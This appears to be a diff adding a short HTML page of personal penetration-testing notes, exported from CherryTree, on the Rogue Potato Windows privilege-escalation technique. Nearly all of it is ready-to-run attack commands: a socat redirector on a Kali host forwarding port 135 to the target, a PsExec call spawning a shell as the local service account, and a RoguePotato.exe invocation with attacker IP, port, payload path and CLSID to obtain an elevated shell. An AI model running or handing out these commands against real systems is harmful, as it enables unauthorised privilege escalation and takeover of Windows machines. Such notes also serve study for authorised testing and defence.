@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Rogue Potato</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Rogue Potato</h1><br/>Rogue Potato takes advantage of a similar vulnerability to Juicy Potato. To my knowledge, this will work on modern windows 10. Needs kali to run a redirector to forward the shell.<br />	On Kali (.8 is the windows target)<br />		sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.11.8:9999<br />	On windows (.5 is the kali)<br />		.\PSExec64.exe /accepteula -i -u &quot;nt authority\local service&quot; C:\Users\user\Desktop\Shell.exe<br />		.\RoguePotato.exe -r 192.168.11.5 -l 9999 -e C:\temp\Shell32.exe -c &quot;{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}&quot;<br /></div></body></html>
